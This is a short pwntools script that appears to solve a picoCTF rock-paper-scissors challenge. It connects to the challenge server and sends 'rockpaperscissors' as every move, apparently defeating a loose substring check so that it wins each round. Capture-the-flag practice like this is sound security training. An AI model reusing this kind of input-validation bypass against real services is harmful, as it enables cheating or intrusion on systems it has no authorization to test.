from pwn import *
context.log_level='debug'

# io = process('./vuln')
io = remote('saturn.picoctf.net', 51420)

io.sendlineafter(b'Type \'2\' to exit the program', b'1')

for i in range(4):
	io.sendlineafter(b'Please make your selection (rock/paper/scissors):',
		 	b'rockpaperscissors')
	io.sendlineafter(b'Type \'2\' to exit the program', b'1')

io.sendlineafter(b'Please make your selection (rock/paper/scissors):',
		 	b'rockpaperscissors')
io.sendlineafter(b'Type \'2\' to exit the program', b'2')


io.interactive()